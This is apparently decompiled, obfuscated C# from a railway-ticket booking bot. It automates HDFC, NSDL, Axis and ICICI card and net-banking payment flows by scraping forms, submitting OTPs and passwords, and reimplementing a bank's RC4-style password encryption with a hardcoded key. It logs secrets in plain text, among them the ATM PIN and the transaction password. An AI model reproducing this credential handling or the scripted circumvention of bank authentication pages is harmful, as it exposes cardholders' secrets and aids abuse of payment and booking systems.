                    string paymentid = jsonData_Serial(response, "razorpay_payment_id");
                    string orderid = jsonData_Serial(response, "razorpay_order_id");
                    string sign = jsonData_Serial(response, "razorpay_signature");
                    postdata = "razorpay_hosted_id=" + text24 + "&razorpay_payment_id=" + paymentid + "&razorpay_order_id=" + orderid + "&razorpay_signature=" + sign;

                    //postdata = //text40;
                    updateTStatus_1.BeginInvoke(1, "Init. " + text4 + "(6/6)", tCntrlName_, null, null);
                    if (!_Request_Razorpay(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                if (response.Contains("irctc.co.in/eticketing/"))
                {
                    A_6 = url;
                    A_5 = response;
                    result = true;
                }
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        private bool Debit_Hdfc(string A_1, string A_2, CookieContainer A_3, string A_4, ref string A_5, ref string A_6)
        {
            string string_ = "";
            string text = "";
            string string_2 = text;
            string text2 = A_1;
            string string_3 = text2;
            bool flag = false;
            clsMain.Lock("Enter ProcessHdfcCC.");
            int num = 0;
            int num2 = 0;
            if (text2.IndexOf("netsafe.hdfcbank.com") < 0)
            {
                int num3 = text2.IndexOf("window.location");
                if (text2.IndexOf("hdfc-acs.wibmo.com") > 0)
                {
                    postdata = class3_0.Method_SerialInp(A_1, ref url, true);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref A_1, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + A_1);
                        return false;
                    }
                    postdata = class3_0.Method_SerialInp(A_1, ref url, true);
                    url = "https://hdfc-acs.wibmo.com" + url;
                    postdata += HttpUtility.UrlEncode(A_4);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref A_1, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + A_1);
                        return false;
                    }
                    A_5 = A_1;
                    A_6 = A_2;
                    return true;
                }
            }
            updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-1/3", tCntrlName_, null, null);
            bool result;
            while (true)
            {
                try
                {
                    text2 = class3_0.Method_SerialInp(A_1, ref string_, true);
                    if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                    {
                        string text3 = A_3?.ToString() + " Gateway not working - Payment Failed";
                        clsMain.Lock("First Hit Failed. err = " + text3);
                        return flag;
                    }
                    A_2 = string_;
                    string text4 = "https://netsafe.hdfcbank.com";
                    while (true)
                    {
                        if (A_4 == "")
                        {
                            clsMain.Lock("ProcessHdfcCC OTP Processing.");
                            string text5 = "";
                            frmOTP frmOTP = new frmOTP();
                            frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "HDFC OTP", class3_0.BANKSAVEAS);
                            if (frmOTP.DialogResult != DialogResult.OK)
                            {
                                frmOTP.Dispose();
                                return false;
                            }
                            text5 = frmOTP.string_0;
                            frmOTP.Dispose();
                            string string_4 = "txtOtpPassword=" + text5 + "&cmdSubmitDynamic=";
                            string text6 = string_3.Substring(string_3.IndexOf("function redirectUrlCancel(choiceType)"));
                            num = text6.IndexOf(".action =");
                            num = text6.IndexOf("\"", num) + 1;
                            num2 = text6.IndexOf("\"", num) - num;
                            string text7 = text6.Substring(num, num2);
                            string string_5 = text4 + text7.Replace("true", "false");
                            updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-2/3", tCntrlName_, null, null);
                            string string_6 = A_2;
                            _Request(string_5, string_4, string_6, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                        }
                        else
                        {
                            clsMain.Lock("ProcessHdfcCC 3D Password Processing.");
                            string text8 = "";
                            if (string_3.IndexOf("Select Any Option", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                num = string_3.IndexOf("randomDigit");
                                num = string_3.IndexOf("\"", num) + 1;
                                num2 = string_3.IndexOf("\"", num) - num;
                                string text9 = string_3;
                                int startIndex = num;
                                int length = num2;
                                string text10 = text9.Substring(startIndex, length);
                                string_ = text4 + "/ACSWeb/jsp/SCode.jsp";
                                if (string_3.IndexOf("ACSWeb/jsp/PayerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    flag = true;
                                    string_ = text4 + "/ACSWeb/jsp/PayerAuth.jsp";
                                }
                                else if (string_3.IndexOf("jsp/DinerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_ = text4 + "/ACSWeb/jsp/DinerAuth.jsp";
                                }
                                string string_7 = "acsRadio=payerAuth&sbmtBtn=Continue&xdeviceId=" + text10 + "&bTz=undefined";
                                if (!_Request(string_, string_7, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                                {
                                    A_6 = "Failed after Payment, Check Status.";
                                    string text11 = "Second Hit Failed. err = ";
                                    string text12 = string_2;
                                    clsMain.Lock(text11 + text12);
                                    return false;
                                }
                                num = string_3.IndexOf("ACTION=");
                                num = string_3.IndexOf("\"", num) + 1;
                                num2 = string_3.IndexOf("\"", num) - num;
                                text8 = string_3.Substring(num, num2);
                            }
                            else
                            {
                                string text13 = string_3.Substring(string_3.IndexOf("function redirectUrlCancel(choiceType)"));
                                num = text13.IndexOf(".action =");
                                num = text13.IndexOf("\"", num) + 1;
                                num2 = text13.IndexOf("\"", num) - num;
                                text8 = text13.Substring(num, num2);
                                text8 = text8.Replace("DYNAMIC_AUTHENTICATION_IMPROVEMENT", "USER_AUTH_IMPROVEMENT");
                            }
                            text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                            text2 = "txtLogin=&txtPassword=&textSalt=";
                            string text14 = "";
                            num = string_3.IndexOf("hidden\" name=\"txtLogin");
                            num = string_3.IndexOf("value=\"", num) + 7;
                            num2 = string_3.IndexOf("\"", num);
                            text14 = string_3.Substring(num, num2 - num);
                            text2 = clsPostData.SetPost(text2, "txtLogin", text14);
                            num = string_3.IndexOf("var saltx =");
                            num = string_3.IndexOf("\"", num) + 1;
                            num2 = string_3.IndexOf("\"", num);
                            text14 = string_3.Substring(num, num2 - num);
                            text2 = clsPostData.SetPost(text2, "textSalt", text14);
                            string text15 = computeSHA_256(A_4);
                            text15 = computeSHA_256(text15 + text14);
                            text2 = clsPostData.SetPost(text2, "txtPassword", HttpUtility.UrlEncode(text15));
                            text2 = clsPostData.SetPost(text2, "cmdSubmit", "Submit");
                            string_ = text4 + text8.Replace("true", "false");
                            if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                            {
                                A_6 = "Third Hit Failed, Check Status.";
                                return false;
                            }
                            if (string_3.IndexOf("perform\" value=\"USER_AUTH_IMPROVEMENT", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-3/3", tCntrlName_, null, null);
                                string string_8 = class3_0.Method_SerialInp(string_3, ref string_, true);
                                if (!_Request(string_, string_8, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                                {
                                    A_6 = "Failed after Payment, Check Status.";
                                    string text16 = "Fourth Hit Failed. err = ";
                                    string text17 = string_2;
                                    clsMain.Lock(text16 + text17);
                                    return false;
                                }
                            }
                            if (string_3.IndexOf("Enter OTP", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                A_4 = "";
                                continue;
                            }
                            if (string_3.IndexOf("com.enstage.entransact.servers.AccessControlServerSSL", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                A_4 = "";
                                A_1 = string_3;
                                break;
                            }
                            if (string_3.IndexOf("form name=\"frmMerchantPost", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                A_4 = "";
                                continue;
                            }
                        }
                        if (!flag)
                        {
                            A_2 = string_;
                            string string_9 = class3_0.Method_SerialInp(string_3, ref string_, true);
                            string value = "form name=\"frmMerchantPost";
                            if (!string_3.Contains(value) && !_Request(string_, string_9, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                            {
                                A_6 = "Failed after Payment, Check Status.";
                                string text18 = "Fourth Hit Failed. err = ";
                                string text19 = string_2;
                                string string_10 = text18 + text19;
                                clsMain.Lock(string_10);
                                return false;
                            }
                        }
                        clsMain.Lock("Success ProcessHdfcCC Finish");
                        A_5 = string_3;
                        string text20 = (A_6 = A_2);
                        bool flag2 = true;
                        result = flag2;
                        goto end_IL_08f9;
                    }
                }
                catch (Exception)
                {
                    result = false;
                    break;
                }
                continue;
            end_IL_08f9:
                break;
            }
            return result;
        }

        private bool Debit_Nsdl(string A_1, string A_2, CookieContainer A_3, string A_4, ref string A_5, ref string A_6)
        {
            string string_ = "";
            string text = "";
            string string_2 = text;
            string text2 = A_1;
            string string_3 = text2;
            bool flag = false;
            clsMain.Lock("Enter ProcessNsdlDc.");
            int num = 0;
            int num2 = 0;
            updateTStatus_1.BeginInvoke(1, "Init. NDSL Wimbo-1/3", tCntrlName_, null, null);
            try
            {
                if (A_1.Contains("/bankresponse/redirectForm"))
                {
                    text2 = class3_0.Method_SerialInp(A_1, ref string_, true);
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    A_2 = string_;
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    Uri uri = new Uri(string_);
                    string text3 = "https://" + uri.Host;
                    A_2 = string_;
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    string_ = text3 + string_;
                    text2 += "&source=nextRedirect";
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    A_2 = string_;
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    uri = new Uri(string_);
                    text3 = "https://" + uri.Host;
                    A_2 = string_;
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    string_ = text3 + "/" + string_;
                    string text4 = "";
                    frmOTP frmOTP = new frmOTP();
                    frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "NSDL OTP", class3_0.BANKSAVEAS);
                    if (frmOTP.DialogResult != DialogResult.OK)
                    {
                        frmOTP.Dispose();
                        return false;
                    }
                    text4 = frmOTP.string_0;
                    frmOTP.Dispose();
                    text2 = text2 + "&txtotp=" + text4 + "&btnsubmit=SUBMIT";
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    A_2 = string_;
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    _Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                    A_5 = string_3;
                    A_6 = string_;
                    return true;
                }
                text2 = class3_0.Method_SerialInp(A_1, ref string_, true);
                if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                {
                    string text5 = A_3?.ToString() + " Gateway not working - Payment Failed";
                    clsMain.Lock("First Hit Failed. err = " + text5);
                    return flag;
                }
                A_2 = string_;
                string text6 = "https://secure-acs2ui-bk2-indmum-mumrdc.wibmo.com";
                while (true)
                {
                    if (A_4 == "")
                    {
                        clsMain.Lock("ProcessHdfcCC OTP Processing.");
                        string text7 = "";
                        frmOTP frmOTP2 = new frmOTP();
                        frmOTP2.method_1(clsMain.control_0, clsMain.rectangle_0, true, "NSDL OTP", class3_0.BANKSAVEAS);
                        if (frmOTP2.DialogResult != DialogResult.OK)
                        {
                            frmOTP2.Dispose();
                            return false;
                        }
                        text7 = frmOTP2.string_0;
                        frmOTP2.Dispose();
                        string string_4 = "txtOtpPassword=" + text7 + "&cmdSubmitDynamic=";
                        string text8 = string_3.Substring(string_3.IndexOf("function redirectUrlCancel(choiceType)"));
                        num = text8.IndexOf(".action =");
                        num = text8.IndexOf("\"", num) + 1;
                        num2 = text8.IndexOf("\"", num) - num;
                        string text9 = text8.Substring(num, num2);
                        string string_5 = text6 + text9.Replace("true", "false");
                        updateTStatus_1.BeginInvoke(1, "Init. NDSL Wimbo-2/3", tCntrlName_, null, null);
                        string string_6 = A_2;
                        _Request(string_5, string_4, string_6, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                        break;
                    }
                    clsMain.Lock("ProcesNDSLCC 3D Password Processing.");
                    text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                    string string_7 = text2 + "&passCode=&formReqType=Submit&flowMode=VERIFICATION&registrationPage=&isInitialADSRegFlag=&forgotPasswordFlag=";
                    text2 += "&otpValue=&formReqType=GenerateOtp&SCREENTTYPE=SCREEN-REGISTER-V1&flowMode=REGISTRATION";
                    string text10 = string_3.Substring(string_3.IndexOf("function Staticpassword()"));
                    num = text10.IndexOf(".action");
                    num = text10.IndexOf("\"", num) + 1;
                    num2 = text10.IndexOf("\"", num) - num;
                    string_ = text10.Substring(num, num2);
                    if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                    {
                        A_6 = "Third Hit Failed, Check Status.";
                        return false;
                    }
                    if (string_3.IndexOf("function authPasswordValidate", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. NDSL Wimbo-3/3", tCntrlName_, null, null);
                        string_7 = clsPostData.SetPost(string_7, "passCode", HttpUtility.UrlEncode(A_4));
                        if (!_Request(string_, string_7, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                        {
                            A_6 = "Failed after Payment, Check Status.";
                            string text11 = "Fourth Hit Failed. err = ";
                            string text12 = string_2;
                            clsMain.Lock(text11 + text12);
                            return false;
                        }
                    }
                    if (string_3.IndexOf("Enter OTP", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        A_4 = "";
                        continue;
                    }
                    if (string_3.IndexOf("form name=\"frmMerchantPost", StringComparison.CurrentCultureIgnoreCase) > 0)
                    {
                        break;
                    }
                    A_4 = "";
                }
                if (!flag)
                {
                    A_2 = string_;
                    string value = "form name=\"frmMerchantPost";
                    if (!string_3.Contains(value))
                    {
                        string string_8 = class3_0.Method_SerialInp(string_3, ref string_, true);
                        if (!_Request(string_, string_8, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                        {
                            A_6 = "Failed after Payment, Check Status.";
                            string text13 = "Fourth Hit Failed. err = ";
                            string text14 = string_2;
                            string string_9 = text13 + text14;
                            clsMain.Lock(string_9);
                            return false;
                        }
                    }
                }
                clsMain.Lock("Success ProcessHdfcCC Finish");
                A_5 = string_3;
                string text15 = (A_6 = A_2);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public string SetVairalbleintoString(string Url, string str22)
        {
            string text = "";
            string result = "";
            try
            {
                if (!string.IsNullOrEmpty(str22))
                {
                    string[] array = Strings.Split(str22, "&");
                    int num = Information.UBound(array);
                    for (int i = 0; i <= num; i++)
                    {
                        string[] array2 = Strings.Split(array[i], "#");
                        text = text + "<input type=\"hidden\" name=\"" + array2[0] + "\" value=\"" + array2[1] + "\" />";
                    }
                }
                result = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en-IN\"><head><script type=\"text/javascript\" src=\"/eticketing/javax.faces.resource/scommon.js.jsf?ln=js\"></script><script type=\"text/javascript\">\t\t\t\tcheckUId(\"10599\");\t\t\t</script><script type=\"text/javascript\">\t\t\t\tsetRId(\"1520332067667\");\t\t\t</script><link type=\"text/css\" rel=\"stylesheet\" href=\"/eticketing/org.richfaces.resources/javax.faces.resource/org.richfaces.staticResource/4.2.3.Final/PackedCompressed/blueSky/skinning.css\" /></head><body><form action=\"" + Url + "\" method=\"POST\">" + text + "</form>     <center><font size=\"5\" color=\"#3b4455\">Transaction is being processed<br />Please wait ...</font></center> <script type=\"text/javascript\">\tdocument.forms[0].submit();</script></body></html>";
            }
            catch
            {
            }
            return result;
        }

        public static string computeSHA_256(string input)
        {
            HashAlgorithm hashAlgorithm = HashAlgorithm.Create("SHA-256");
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            byte[] array = hashAlgorithm.ComputeHash(bytes);
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < array.Length; i++)
            {
                stringBuilder.Append($"{array[i]:x2}");
            }
            return stringBuilder.ToString();
        }

        private bool method_105(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_89 = "";
            clsMain.Lock("Enter ProcessAxisNetBanking.");
            if (string_86.Contains("axisbiconnect"))
            {
                string string_91 = class3_0.string_69;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string string_92 = array[1];
                string text2 = array[2];
                string string_93 = "";
                string text3;
                if (bool_13)
                {
                    bool_13 = false;
                    string[] array2 = string_86.Split(new string[1] { "|" }, StringSplitOptions.None);
                    text3 = array2[0];
                    string_93 = array2[1];
                }
                else
                {
                    text3 = class3_0.Method_SerialInp(string_86, ref string_93, false);
                }
                CookieContainer cookieContainer_ = null;
                string text4 = "https://www.axisbiconnect.co.in";
                string string_94 = "";
                string string_95 = "";
                bool flag = false;
                try
                {
                    bool_24 = true;
                    string_21 = "First Hit : Inp = " + text3;
                    if (!_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                    {
                        string_90 = "Axis Not Working - Payment Failed";
                        return false;
                    }
                    if (!string.IsNullOrEmpty(string_95.Trim()) && string_95.Contains("document.Redirect.submit"))
                    {
                        int num = string_95.IndexOf("action=");
                        int length = string_95.IndexOf(">", num) - num;
                        string text5 = string_95.Substring(num, length).Trim().Replace("\"", "'");
                        num = text5.IndexOf("ion='") + 5;
                        length = text5.IndexOf("'", num) - num;
                        string text6 = text5.Substring(num, length);
                        num = text6.IndexOf("BankAway");
                        num = text6.IndexOf("/", num) + 1;
                        length = text6.IndexOf("/", num) - num;
                        string text7 = text6.Substring(num, length);
                        string_91 = "https://www.axisbiconnect.co.in/BankAway/sgonHttpHandler.aspx";
                        string_93 = text4 + text6;
                        string_21 = "Second Hit : Inp = " + text3;
                        if (!_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                        {
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        if (!string_95.Contains("Welcome to AXIS BANK Net Payment facility"))
                        {
                            string_90 = "Failed while Login into Axis Bank";
                            clsMain.Lock("Second Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        Thread.Sleep(2000);
                        int startIndex = string_95.IndexOf("id=\"AuthenticationFG");
                        num = string_95.IndexOf("formActionField", startIndex);
                        num = string_95.IndexOf("lue=\"", num) + 5;
                        length = string_95.IndexOf("\"", num) - num;
                        string text8 = string_95.Substring(num, length).Trim();
                        num = string_95.IndexOf("rno", startIndex);
                        num = string_95.IndexOf("lue=\"", num) + 5;
                        length = string_95.IndexOf("\"", num) - num;
                        string text9 = string_95.Substring(num, length).Trim();
                        num = string_95.IndexOf("ACTION=\"sgonHttpHandler");
                        num = string_95.IndexOf("\"", num) + 1;
                        length = string_95.IndexOf("\"", num) - num;
                        string text10 = string_95.Substring(num, length).Trim();
                        while (true)
                        {
                            string_93 = "https://www.axisbiconnect.co.in/BankAway/" + text7 + "/web/L001/retail/jsp/ebpp/" + text8;
                            string_91 = string_29;
                            text3 = "RETLOGIN=Y&BANKID=211&RID=" + text9 + "&USER_ID=" + text;
                            string_21 = "Third Hit (Just an AJAX Call) : Inp = " + text3;
                            if (_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                            {
                                if (!string_95.Contains("N") && !string_95.Contains("M"))
                                {
                                    string_90 = "Unexpected Error Occured while Checking Bank User ID";
                                    clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                                    return false;
                                }
                                string[] array3 = new string[5] { "CorporateSignonCorpId=", null, null, null, null };
                                Class10.object_1 = 1876936332;
                                array3[1] = text;
                                array3[2] = "&CorporateSignonPassword=";
                                array3[3] = smethod_12(text9, string_92);
                                array3[4] = "&isAllowed=false&isEncrypted=Y";
                                text3 = string.Concat(array3);
                                string_93 = "https://www.axisbiconnect.co.in/BankAway/" + text7 + "/web/L001/retail/jsp/ebpp/" + text10;
                                string_21 = "Fourth Hit : Inp = " + text3;
                                if (_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                                {
                                    if (string_95.Contains("Debit Account"))
                                    {
                                        break;
                                    }
                                    string_90 = "Failed while Login on Bank";
                                    clsMain.Lock("Fourth Hit, Not valid HTML err = " + string_90);
                                    if (!(!string_95.Contains("Please Enable Java Script through") || flag))
                                    {
                                        flag = true;
                                        clsMain.Lock("Try to Login once more----------");
                                        continue;
                                    }
                                    return false;
                                }
                                clsMain.Lock("Fourth Hit Failed. err = " + string_94);
                                string_90 = "Failed while making Payment.";
                                return false;
                            }
                            clsMain.Lock("Third Hit Failed. err = " + string_94);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        num = string_95.IndexOf("ACTION=\"tranHttpHandler");
                        num = string_95.IndexOf("\"", num) + 1;
                        length = string_95.IndexOf("\"", num) - num;
                        string text11 = string_95.Substring(num, length).Trim();
                        text3 = "UserAccountsIndex=0&bills.PaymentRemarks=+&Action.Bills.ShoppingMall.MakePayment.PayPost2FACheck.sms=%A0+%A0Pay%A0%A0";
                        string_91 = string_29;
                        string_93 = "https://www.axisbiconnect.co.in/BankAway/" + text7 + "/web/L001/retail/jsp/ebpp/" + text11;
                        clsMain.Lock("Fifth Hit : Inp = " + text3);
                        if (!_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                        {
                            clsMain.Lock("Fifth Hit Failed. err = " + string_94);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Fifth Hit : Output = " + string_95);
                        if (!string_95.Contains("Now finish your transaction faster"))
                        {
                            string_90 = "Failed Just before Transaction Password, No Payment was deducted";
                            clsMain.Lock("Fifth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        num = string_95.IndexOf("ACTION=\"tranHttpHandler");
                        num = string_95.IndexOf("\"", num) + 1;
                        length = string_95.IndexOf("\"", num) - num;
                        text11 = string_95.Substring(num, length).Trim();
                        string_93 = "https://www.axisbiconnect.co.in/BankAway/" + text7 + "/web/L001/retail/jsp/ebpp/" + text11;
                        string_91 = string_29;
                        text3 = "ValCorpTxnPwdUserName=" + text + "&ValCorpTxnPwdTxnPwd=" + text2 + "&Action.Bills.ShoppingMall.TxnLogin.Ok=+Validate+";
                        clsMain.Lock("Sixth Hit : Inp = " + text3);
                        if (!_Request(string_93, text3, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_95, ref string_94, ref webException_0))
                        {
                            clsMain.Lock("Sixth Hit Failed. err = " + string_94);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Sixth Hit : Output = " + string_95);
                        if (!string_95.Contains("document.shoppingmallreturn.submit"))
                        {
                            string_90 = "";
                            if (string_95.Contains("<script> alert"))
                            {
                                num = string_95.IndexOf("<script> alert");
                                num = string_95.IndexOf("'", num) + 1;
                                length = string_95.IndexOf("'", num) - num;
                                string_90 = string_95.Substring(num, length).Trim();
                            }
                            if (string.IsNullOrEmpty(string_90))
                            {
                                string_90 = "Failed After Transaction Password, Ticket not Booked";
                            }
                            clsMain.Lock("Sixth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        string_89 = string_95;
                        string_90 = string_93;
                        result = true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessAxisNetBanking", ex.Message);
                    result = false;
                }
                finally
                {
                    bool_24 = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with Axis Payment";
            clsMain.Lock("Html doesn't contains axisbiconnect, returning.");
            return false;
        }

        private static string smethod_12(string string_86, string string_87)
        {
            string text = "29304E87583278923487A64389764380763087426708234658764320F8764387645678023467843678657678243678934208346543763426342087364764378623487165321780324643278643287634807347867463247864326D43204376743286743290874784C3260409A876";
            byte[] array = new byte[242];
            string text2 = "d#s|Ï××ø\u00b8ÛBíW²÷KRôç\0 \0\0\0\u00b4G\u0083¹\u009c0µ#\u0006àii>Oæ\u009c¦\u0084Õ\u008byL¦dÁB1öR";
            for (int i = 0; i < text2.Length; i++)
            {
                array[i + 98] = (byte)text2[i];
            }
            string text3 = string_86;
            array[96] = 185;
            string_86 = text3 + text;
            string text4 = "þux\u0018üª";
            for (int j = 0; j < text4.Length; j++)
            {
                array[j + 90] = (byte)text4[j];
            }
            array[152] = 223;
            int[] array2 = new int[256];
            array[151] = 249;
            int[] array3 = array2;
            array[89] = 18;
            array[97] = 139;
            array[87] = 11;
            int k = 0;
            array[153] = 190;
            array[86] = 253;
            array[88] = 241;
            for (; k < 256; k++)
            {
                array3[k] = k;
            }
            int num = 0;
            for (k = 0; k < 256; k++)
            {
                num = (num + array3[k] + string_86[k % string_86.Length]) % 256;
                int num2 = array3[k];
                array3[k] = array3[num];
                array3[num] = num2;
            }
            k = 0;
            num = 0;
            string text5 = "";
            for (int l = 0; l < string_87.Length; l++)
            {
                k = (k + 1) % 256;
                num = (num + array3[k]) % 256;
                int num3 = array3[k];
                array3[k] = array3[num];
                array3[num] = num3;
                text5 += (char)(string_87[l] ^ array3[(array3[k] + array3[num]) % 256]);
            }
            return Class12.smethod_22(text5);
        }

        internal bool method_106(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessICICIDebit.");
            bool result2;
            if (!string_86.Contains("icicibank"))
            {
                string_90 = "Some thing went wrong with ICICI Debit Payment";
                clsMain.Lock("Html doesn't contains icicibank, returning.");
                result2 = false;
            }
            else
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string text6 = array[4];
                string string_92 = "";
                string text7 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                if (text.Length == 16 || text[0] == '4' || text[0] == '5')
                {
                    string string_93 = "";
                    string string_94 = "";
                    try
                    {
                        clsMain.Lock("First Hit Inp = " + text7);
                        if (!_Request(string_92, text7, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("First Hit Failed. err = " + string_93);
                            string_90 = "ICICI Debit Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("First Output htm = " + string_94);
                        if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("Card Type"))
                        {
                            int int_ = 1337;
                            string text8 = text.Substring(0, 4);
                            string text9 = text.Substring(4, 4);
                            string text10 = text.Substring(8, 4);
                            string text11 = text.Substring(12, 4);
                            string text12 = "VISA%7C1";
                            string text13 = "VISA";
                            if (text[0] == '\u0005')
                            {
                                text12 = "MC%7C1";
                                text13 = "MC";
                            }
                            int startIndex = string_94.IndexOf("name=\"MerchantTxnID");
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            int length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string text14 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("MerchantID", startIndex);
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string text15 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("txnId", startIndex);
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string text16 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("Matrix", startIndex);
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string string_95 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            startIndex = string_94.IndexOf("Seed", startIndex);
                            startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                            length = string_94.IndexOf("\"", startIndex) - startIndex;
                            string text17 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                            if (text17.Length >= 4)
                            {
                                int result3 = 0;
                                int.TryParse(text17, out result3);
                                if (result3 > 0)
                                {
                                    int_ = result3;
                                }
                            }
                            clsMain.Lock("ATMPIN = " + text5);
                            text5 = method_108(text5, string_95, int_);
